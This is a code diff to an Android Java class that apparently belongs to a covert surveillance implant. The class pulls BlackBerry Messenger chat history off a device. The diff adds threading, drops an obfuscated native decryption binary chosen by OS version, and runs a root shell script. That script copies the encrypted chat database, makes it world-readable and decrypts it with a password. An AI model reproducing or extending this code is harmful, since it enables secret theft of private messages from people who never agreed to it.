@@ -1,6 +1,7 @@
 package com.android.dvci.module.chat;
 
 import android.database.Cursor;
+import android.os.Build;
 import android.util.Base64;
 import android.util.Log;
 
@@ -107,40 +108,51 @@ public class ChatBBM extends SubModuleChat {
 			}
 			return;
 		}
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
 
-		try {
-			if (helper == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateHistory) cannot open db");
+
+		Thread t = new Thread(new Runnable() {
+			@Override
+			public void run() {
+				GenericSqliteHelper helper = null;
+				try {
+
+					helper = GenericSqliteHelper.openCopy(dbFileMaster);
+					if (helper == null) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (updateHistory) cannot open db");
+						}
+					}
+					if (helper == null) {
+						helper = openBBMChatEnc(dbFileMasterEnc);
+					}
+
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (start), read lastBBM: " + lastBBM);
+					}
+
+					if (Cfg.DEBUG) {
+						Check.asserts(account != null, " (updateHistory) Assert failed, null account");
+					}
+
+					readBBMChatHistory(helper);
+
+
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (updateHistory) Error: " + e);
+					}
+				} finally {
+					readChatSemaphore.release();
+					if (helper != null) {
+						helper.disposeDb();
+					}
+
 				}
 			}
-			if (helper == null) {
-				helper = openBBMChatEnc(dbFileMasterEnc);
-			}
+		});
+		t.start();
 
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
-			}
-
-			readBBMChatHistory(helper);
-
-
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateHistory) Error: " + e);
-			}
-		} finally {
-			if (helper != null) {
-				helper.disposeDb();
-			}
-			readChatSemaphore.release();
-		}
 	}
 
 	private GenericSqliteHelper openBBMChatEnc(String dbFileMasterEnc) {
@@ -149,13 +161,20 @@ public class ChatBBM extends SubModuleChat {
 		String pack = Status.self().getAppContext().getPackageName();
 		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-		final AutoFile bbconvert = new AutoFile(installPath, M.e("bb")); // selinux_suidext
+		final AutoFile bbconvert= new AutoFile(installPath, M.e("bb"));
 		final AutoFile dbplain = new AutoFile(installPath, M.e("p.db"));
 		final AutoFile dbenc = new AutoFile(installPath, M.e("e.db"));
 		dbplain.delete();
 		dbenc.delete();
 
-		if(! Utils.dumpAsset(M.e("bb.data"), bbconvert.getName())){
+		boolean asset;
+		if (Build.VERSION.SDK_INT <= 16) {
+			asset = Utils.dumpAsset(M.e("bb.data"), bbconvert.getName());
+		}else{
+			asset = Utils.dumpAsset(M.e("bbl.data"), bbconvert.getName());
+		}
+
+		if(! asset){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (openBBMChatEnc), Error, cannot find resource");
 			}
@@ -164,27 +183,24 @@ public class ChatBBM extends SubModuleChat {
 
 		Execute.execute(M.e("/system/bin/chmod 755 ") + bbconvert.getFilename());
 
-		String command = String.format(M.e("cat %s > %s"), dbFileMasterEnc, dbenc);
-		ExecuteResult res = Execute.executeRoot(command);
+		String command = String.format(M.e("cat %s > %s;\n chmod 777 %s; \n"), dbFileMasterEnc, dbenc, dbenc);
+		command += String.format(M.e("%s %s %s %s\n"), bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
+		command += String.format(M.e("chmod 777 %s; \n"), dbplain);
 
-		Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (openBBMChatEnc) execute: " + command + " ret: " + res.exitCode);
-		}
+		ExecuteResult res = Execute.executeScript(command);
 
 		if(!dbenc.exists()){
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc");
+				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc not exists: " + dbenc);
 			}
 			return null;
 		}
 
-		command = String.format("%s %s %s %s", bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
-		res = Execute.execute(command);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (openBBMChatEnc) execute: " + bbconvert + " ret: " + res.exitCode);
+		if(!dbplain.exists()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), ERROR dbplain not exists: " + dbenc);
+			}
+			return null;
 		}
 
 		bbconvert.delete();
